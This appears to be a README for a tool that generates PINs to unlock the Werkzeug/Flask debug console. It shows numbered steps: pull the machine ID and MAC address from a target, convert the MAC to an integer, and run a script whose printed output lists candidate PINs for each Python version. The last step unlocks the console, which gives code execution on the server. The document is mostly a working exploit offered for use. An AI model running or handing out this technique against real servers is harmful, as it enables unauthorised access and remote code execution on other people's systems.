# Werkzeug Console PIN Exploit
![alt text](https://github.com/ahrixia/flask-console-pin-generator/blob/main/poc-img/Werkzeug_Console_OUT.png "Locked Console")
### Tested on :
- Python 3.6.9
- Server - Werkzeug 1.0.1
- Linux 4.15.0-20-generic #21-Ubuntu x86_64 GNU/Linux

## Proof of Concept - POC
1. Get `/etc/machine-id` and `/sys/class/net/$INTERFACE/address` from the target. 
3. Convert the Interface address(MAC) to integer form. Eg- `00:50:56:bf:d7:70` to `345052796784`. This could be done using python as follows:
```python
>>> print(0x005056bfd770)
345052796784
```
3. Run the python script.
```bash
$python as.py --uuid 345052796784  --machineid 00566233196142e9961b4ea12a2bdb29 
[!] App.py base path not provided, trying on Python Versions - 2.7 and 3.0 - 3.8.
Python V2.7 PIN: 134-138-423
Python V3.0 PIN: 278-866-810
Python V3.1 PIN: 299-529-114
Python V3.2 PIN: 223-757-906
Python V3.3 PIN: 181-173-573
Python V3.4 PIN: 201-362-587
Python V3.5 PIN: 195-645-696
Python V3.6 PIN: 328-723-543
Python V3.7 PIN: 300-924-247
Python V3.8 PIN: 880-398-758
```
4. Use the PIN with the Python Version installed on the target to get into the console.
![alt text](https://github.com/ahrixia/flask-console-pin-generator/blob/main/poc-img/Werkzeug_Console_IN.png "Unlocked Console")
---
**NOTE**: This script runs with some default infomation such as Username as www-data and Hash as MD5. You can run the `-h` flag for more information.
